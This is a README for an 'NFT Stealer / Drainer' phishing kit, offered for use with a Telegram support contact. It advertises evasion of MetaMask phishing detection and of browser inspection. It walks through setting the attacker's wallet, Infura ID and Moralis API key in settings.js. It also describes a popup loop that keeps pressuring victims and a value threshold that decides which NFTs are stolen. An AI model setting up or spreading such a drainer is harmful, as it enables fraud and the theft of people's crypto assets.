### ⚠️ If you need any help, DM me here: [@NFTMontana](https://t.me/nftmontana)

## 🖼️ NFT Stealer / Drainer Template

![preview](https://cdn.discordapp.com/attachments/954420851883769856/968167155482890271/unknown.png)

# 💡 Features
- [x] Inspect Element Detection
- [x] Custom Design
- [x] Cool design 
- [x] Instant transactions
- [x] No contract required
- [x] Anti Metamask Phishing Detections
- [x] Anti F12 Inspect


# 🖍️ Setup Guide: 
you need to edit the **settings.js** file. 
- line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
- line 2: const infuraId = `"APP ID";` replace **APP ID with your Infura ID**
- line 3: const moralisApi = `"X-API-KEY";` replace **X-API-KEY with your Moralis web3 api key**

  - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
  - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.

# ☁️ Important : 

- Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
- Edit lines : nftReceiveAddress: "YOUR WALLET", replace YOUR WALLET with your ETH wallet address.
- Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. Exemple : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.

To get instant support, contact me on my [Telegram](https://t.me/nftmontana)

# 👻 Why it doesn't show my address?

This **NFT stealer** interacts directly with the **nft contract** to transfer it to your address located in the **settings.js** file.
![view](https://media.discordapp.net/attachments/964872997750067240/968100664527945798/Untitled-z1.png)
